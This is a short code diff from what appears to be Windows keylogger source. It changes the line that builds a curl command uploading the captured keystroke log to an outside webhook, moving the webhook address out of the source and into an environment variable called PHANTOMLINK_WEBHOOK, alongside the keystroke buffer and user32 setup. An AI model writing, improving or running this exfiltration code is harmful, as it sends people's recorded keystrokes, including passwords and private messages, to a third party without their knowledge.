@@ -40,7 +40,8 @@ key_buffer = []
 lock = threading.Lock()
 last_timestamp = 0
 
-command = f'curl -F "file=@{log_file}" -F "content=Keylog Update" ***REMOVED***'  #Command
+# Webhook must be supplied via env; never hardcode a live webhook URL in source.
+command = f'curl -F "file=@{log_file}" -F "content=Keylog Update" {os.getenv("PHANTOMLINK_WEBHOOK", "")}'  #Command
 
 user32 = ctypes.WinDLL('user32', use_last_error=True)
 
